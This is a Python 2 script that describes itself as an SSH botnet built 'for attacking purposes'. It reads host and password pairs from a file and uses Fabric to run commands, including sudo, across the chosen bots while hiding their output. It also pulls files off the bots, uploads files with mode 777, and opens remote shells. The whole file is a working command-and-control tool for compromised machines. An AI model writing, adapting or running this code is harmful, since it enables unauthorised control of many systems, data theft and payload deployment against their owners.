#!/usr/bin/python

"""

Author: Yusuf Kassim

This script uses the fabric library to construct a botnet by utilizing SSH connections with each bot. The hostname and credentials for each machine will be read from a file, fed to the fabric framework, and a while loop usedto execute commands to all bots. 

The botnet will be used to automate downloads, uploads, and execute commands for attacking purposes.

"""

import paramiko
import sys
from fabric.api import *
from colorama import Fore


with open("hosts","rb") as fobj:
    lines = fobj.read().splitlines()

for line in lines:
    bot,passwd = line.split()
    env.hosts.append(bot)
    env.passwords[bot] = passwd


class BotNet(object):

    def __init__(self):

        self.hosts = env.hosts
        self.passwords = env.passwords
        self.prompt = "[Pythonic_Botnet#] "


    def run_cmd(self,command):

        try:

            with hide("running","stdout","stderr"):

                if "sudo" in command[0:4]:
                    output = sudo(command)
                else:
                    output = run(command)
                
        except:

            output = "[!] Something went wrong."

        return output


    def alive_hosts(self):
        
        for bot,output in execute(self.run_cmd,"uptime",hosts=self.hosts).iteritems():
            if output == "[!] Something went wrong.":
                print bot + " is dead"
            else:
                print bot + " is alive"


    def host_list(self):

        for num,bot in enumerate(self.hosts):
            print str(num) + " " + bot
    
    def download(self,location):

        try:
            with hide("running","stdout","stderr"):
                get(remote_path=location,local_path="/home/binyamin/tmp")
                result = "[*] File successfully downloaded."

        except:

            result = "[!] Unsuccessful Download."
        return result

    
    def upload(self,local,remote):
        
        try:
            with hide("running","stdout","stderr"):
                put(local,remote,mode=777)
                result = "[*] File sucessfully uploaded."
        except:

            result = "[!] Unsuccessful Upload."

        return result
                


    def menu(self):

        print Fore.BLUE + "SSH Botnet" + Fore.RESET
        print
        options = ["List Hosts","Alive Hosts","Execute Command","Download","Upload","Open Shell"]
        for i in range(len(options)):
            print str(i) + " ===> " + options[i] 


    def select_hosts(self):

        selection = []
        print
        print "Select bots to execute a task [0 1 2 etc] :"
        print
        self.host_list()
        for bot in raw_input("Bots: ").split():
            selection.append(self.hosts[int(bot)])
        return selection


    def main(self):
        
        print
        self.menu()
        print
        option = raw_input(self.prompt + "")
        print

        while option.lower() != "quit":

            if option == "0":
                self.host_list()

            elif option == "1":
                self.alive_hosts()

            elif option == "2":

                command = raw_input("Give a command: ")

                for bot,output in execute(self.run_cmd,command,hosts=self.select_hosts()).iteritems():
                    print Fore.GREEN + bot + ", " + command + Fore.RESET
                    print output 
                    print ("*" * 140) 

            elif option == "3":
                
                location = raw_input("Enter file to download: ")
                
                for bot,result in execute(self.download,location,hosts=self.select_hosts()).iteritems():
                    print Fore.GREEN + bot + Fore.RESET
                    print result 
                    print ("*" * 140) 
            
            elif option == "4":

                local = raw_input("local file location: ")
                remote = raw_input("remote file location: ")
                
                for bot,result in execute(self.upload,local,remote,hosts=self.select_hosts()).iteritems():
                    print Fore.GREEN + bot + Fore.RESET
                    print result 
                    print ("*" * 140) 
            
            elif option == "5":
                
                self.host_list()
                print
                bot = raw_input("Select a bot [0 1 2 etc]: ")
                print
                execute(open_shell,host=self.hosts[int(bot)])
            
            print
            self.menu()
            print
            option = raw_input(self.prompt + "")
            print
        
test = BotNet()
test.main()
